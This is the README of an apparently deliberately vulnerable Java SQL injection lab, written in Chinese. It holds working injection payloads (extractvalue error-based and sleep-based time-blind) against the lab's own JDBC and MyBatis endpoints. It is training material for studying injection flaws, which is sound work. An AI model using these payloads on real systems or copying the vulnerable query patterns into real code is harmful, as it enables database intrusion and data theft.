# Java-SQL注入靶场

# 部署

修改`src/main/resources/application-dev.yml`中的数据库信息

![image-20220912214641993](images/image-20220912214641993.png)

将表导入数据库`src/main/resources/user.sql`

![image-20220912214725961](images/image-20220912214725961.png)

## 一、JDBC

**src/main/java/com/uzju/dongtai_sql_inject_lab/controller/JDBCInject.java**

### 1、+号拼接

#### 1.1、PAYLOAD

```bash
/jdbc/statement_and_inject?id=1'+and+extractvalue(1,concat(0x7e,user()))--+
```

![image-20220911211335064](images/image-20220911211335064.png) 

#### 1.2、实现代码

![image-20220911211433982](images/image-20220911211433982.png)

### 2、prepareStatement注入+号拼接

#### 2.1、PAYLOAD

```bash
/jdbc/preparestatement_and_inject?id=1'+and+extractvalue(1,concat(0x7e,user()))--+
```

![image-20220911211718206](images/image-20220911211718206.png)

#### 2.2、实现代码

![image-20220911213628419](images/image-20220911213628419.png)

### 3、prepareStatement Orderby注入

#### 3.1、PAYLOAD

```bash
/jdbc/preparestatement_orderby_inject?id=1&orderby=id+and+extractvalue(1,concat(0x7e,user()))
```

![image-20220911213751260](images/image-20220911213751260.png)

#### 3.2、代码实现

![image-20220911213808120](images/image-20220911213808120.png)

### 4、prepareStatement like注入

#### 4.1、PAYLOAD

```bash
/jdbc/preparestatement_like_inject?id=1%25'+and+extractvalue(1,concat(0x7e,user()))--+
```

![image-20220911213920154](images/image-20220911213920154.png)

#### 4.2、代码实现

![image-20220911213958343](images/image-20220911213958343.png)

### 5、prepareStatement in注入

#### 5.1、PAYLOAD

```bash
/jdbc/preparestatement_in_inject?id=1)+and+extractvalue(1,concat(0x7e,user()))--+
```

![image-20220911214118938](images/image-20220911214118938.png)

#### 5.2、代码实现

![image-20220911214054339](images/image-20220911214054339.png)



## 二、Mybatis

### 1、mybatis ${}注入

#### 1.1、PAYLOAD

```bash
/mybatis/getUser_inject?id=1+and+sleep(3)
```

![image-20220912214228801](images/image-20220912214228801.png)

### 2、mybatis orderby注入

#### 2.1、PAYLOAD

```bash
/mybatis/getUser_orderby_inject?id=1&getparse=id+and+if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test))
```

![image-20220912214045899](images/image-20220912214045899.png)

### 3、mybatis like注入

#### 3.1、PAYLOAD

```bash
/mybatis/getUser_like_inject?id=1&username=admin'+and+sleep(3)--+
```

![image-20220912214345378](images/image-20220912214345378.png)

### 4、mybatis in注入

#### 4.1、PAYLOAD

```bash
/mybatis/getUser_in_inject?id=1)+and+sleep(3)--+
```

![image-20220912214436618](images/image-20220912214436618.png)
